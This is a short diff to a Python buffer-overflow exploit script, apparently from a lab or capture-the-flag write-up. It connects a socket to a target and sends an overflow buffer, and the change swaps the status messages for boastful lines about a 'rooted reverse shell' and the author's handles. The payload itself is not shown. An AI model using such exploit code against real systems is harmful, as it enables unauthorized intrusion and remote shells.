@@ -781,9 +781,15 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
   s.connect((ip, port))
-  print("Sending evil buffer...")
+  print("666:fz3r00t\> Sending the final Buffer Overflow with a sexy payload...")
   s.send(bytes(buffer + "\r\n", "latin-1"))
-  print("Done!")
+  print("")
+  print("  I went to hell and came back with a treasure, enjoy your rooted reverse shell!!!") 
+  print("")
+  print("            Twitter:  Fz3r0_OPs")
+  print("            Github :  Fz3r0")  
+  print("")
+  print("            I'm Fz3r0 and the Sun no longer rises...")
 except:
   print("Could not connect.")
 ```
